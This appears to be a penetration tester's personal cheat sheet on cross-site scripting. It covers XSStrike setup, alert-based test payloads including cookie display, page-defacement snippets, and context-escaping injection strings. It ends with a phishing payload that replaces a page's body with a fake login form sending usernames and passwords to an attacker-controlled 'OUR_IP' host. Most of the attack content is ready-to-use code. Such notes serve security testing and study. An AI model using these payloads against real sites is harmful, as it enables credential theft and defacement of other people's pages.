---
Primary_category: "[[WEB ATTACKS]]"
title: "XSS"
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
cssclasses:
  - card-list
  - purple-style
---

###### PRIMARY CATEGORY → [[WEB ATTACKS]]

#### *Components* ⟡

- ![](https://giffiles.alphacoders.com/222/222700.gif)
	- [[PERSISTENT XSS]]
- ![](https://giffiles.alphacoders.com/222/222700.gif)
	- [[NON-PERSISTENT XSS]]
- ![](https://giffiles.alphacoders.com/222/222700.gif)
	- [[BLIND XSS]]

<br>

---

#### *Discovery*

##### *Automatic*

###### *XSS Strike*

- ***Setup***

```bash
git clone https://github.com/s0md3v/XSStrike XSStrike
cd !$ && python3 -m venv .venv
. !$/bin/activate && pip3 install -r requirements.txt
```

- ***Usage***

> ***GET***

```bash
python3 xsstrike.py --url '<URL>?<PARAM>=<VALUE>&<PARAM>=<VALUE>'
```

> ***POST***

```bash
python3 xsstrike.py --url '<URL>' --data '<PARAM>=<VALUE>'
```

---

#### *Testing Payloads*

##### *General*

```javascript
<script>alert(location.origin)</script> # Useful on IFRAME Contexts
<script>alert(document.domain)</script>
<img src=x onerror=alert(location.origin)>
<svg onload=alert(location.origin)>
```

##### *Cookies*

```javascript
alert(document.cookie)
```

##### *Resources*

***[PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md)***

***[Payload-Box](https://github.com/payload-box/xss-payload-list)***

---

#### *Web Defacement*

##### *Changing Background*

###### *Background Color*

```js
document.body.style.background = "<COLOR>"
```

###### *Background Image*

```js
document.body.background = "<IMAGE_URL>"
```

##### *Changing Page Title*

```js
document.title = "<STRING>"
```

##### *Changing Page Text*

```js
document.getElementById("<HTML_TAG_ID>").innerHTML = "<STRING>"
```

> ***JQuery***

```js
$("<HTML_TAG_ID>").html('<STRING>');
```

###### *Changing the entire HTML Code of the Body*

```js
document.getElementsByTagName('body')[0].innerHTML = "<STRING>"
```

---

#### *Login Form Injection*

##### *Login Form*

> ***Sample***

```js
<h3>Please login to continue</h3>
<form action=http://OUR_IP>
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
```

##### *Payload*

First, we have to look for an injection point vulnerable to *XSS*. Once we find it, we can modify the *HTML* code from the client side by running the *javascript* payload below

- ***Injection Point***

> ***GET Parameter***

```bash
https://www.domain.com?url=<USER_INPUT>
```

- ***Reflected Input in the HTTP Response***

```bash
...<SNIP>...
<img src='<USER_INPUT'>
...<SNIP>...
```

- ***Escaping the context***

> ***JS Execution on HTML Attribute***

We leverage the *img* tag itself to close the *src* attribute and add a *js* code using the *onerror* attribute handler

```bash
x' onerror=alert(location.origin)> <!--
```

> ***JS Execution within an SCRIPT tag***

In this case, we close the entire *img* tag context and add an *script* tag to include *js* code

```bash
'><script>alert(document.cookie)</script> <!--
```

- ***Minified Payload***

In order to accomplish the *phishing*, simply replace the standard *alert* payload with the code below, which adds a form that sends the entered data to an *HTTP* server controlled by the attacker

```js
document.body.innerHTML = '<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>'
```